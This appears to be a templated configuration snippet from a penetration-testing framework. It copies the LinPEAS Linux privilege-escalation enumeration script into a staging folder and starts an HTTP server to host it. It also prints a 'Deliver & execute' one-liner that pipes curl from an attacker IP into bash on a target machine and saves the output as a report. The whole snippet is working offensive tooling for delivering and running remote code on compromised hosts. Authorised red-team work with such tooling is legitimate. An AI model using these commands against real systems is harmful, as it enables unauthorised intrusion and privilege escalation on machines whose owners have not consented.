content: |
  mkdir -p packstation/outbound; bash -c 'cp -n {{ tools_dir }}/linpeas/* packstation/outbound/'; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                       -----Linux------                         '; \
  printf '%s\n' 'Deliver & execute: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/linpeas.sh | bash > {{ delivery_path_linux }}/report.txt'; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
